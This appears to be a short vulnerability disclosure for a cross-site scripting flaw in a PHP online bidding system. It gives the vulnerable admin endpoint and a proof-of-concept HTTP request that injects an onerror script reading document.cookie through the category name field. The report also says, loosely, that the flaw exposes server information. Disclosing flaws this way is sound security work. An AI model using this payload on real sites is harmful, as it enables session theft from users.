## Sourcecoster simple online bidding system has XSS vulnerability

## submitter
zhangMingMing

## supplier
https://www.sourcecodester.com/php/14558/simple-online-bidding-system-using-phpmysqli-source-code.html

## Vulnerability file
/simple-online-bidding-system/bidding/admin/ajax.php?action=save_category

## Vulnerability analysis

Echo is used here for parameter output.
<img width="1210" alt="image" src="https://github.com/user-attachments/assets/2e2c2e65-1769-4bee-a76e-c6f4bf7c506c">


## describe
There are unlimited XSS attacks in the simple online bidding system, and the controllable parameter is $name. An attacker can obtain sensitive server information through this vulnerability.

POC
```
POST /simple-online-bidding-system/bidding/admin/ajax.php?action=save_category HTTP/1.1
Host: localhost
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:95.0) Gecko/20100101 Firefox/95.0
Accept: */*
Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2
Accept-Encoding: gzip, deflate
X-Requested-With: XMLHttpRequest
Content-Type: multipart/form-data; boundary=---------------------------266074951711231239711048308010
Content-Length: 324
Origin: http://localhost
Connection: close
Referer: http://localhost/simple-online-bidding-system/bidding/admin/index.php?page=categories
Cookie: PHPSESSID=cims89c5nt143re39d3ce6cdvd
Sec-Fetch-Dest: empty
Sec-Fetch-Mode: cors
Sec-Fetch-Site: same-origin

-----------------------------266074951711231239711048308010
Content-Disposition: form-data; name="id"

8
-----------------------------266074951711231239711048308010
Content-Disposition: form-data; name="name"

<img src=1 onerror=alert(document.cookie)>
-----------------------------266074951711231239711048308010--
```

<img width="1492" alt="image" src="https://github.com/user-attachments/assets/78266955-3175-4405-a17d-b81bb50d8af2">

<img width="1158" alt="image" src="https://github.com/user-attachments/assets/8e4ce6b6-edd1-44d6-a059-895d278d3b89">







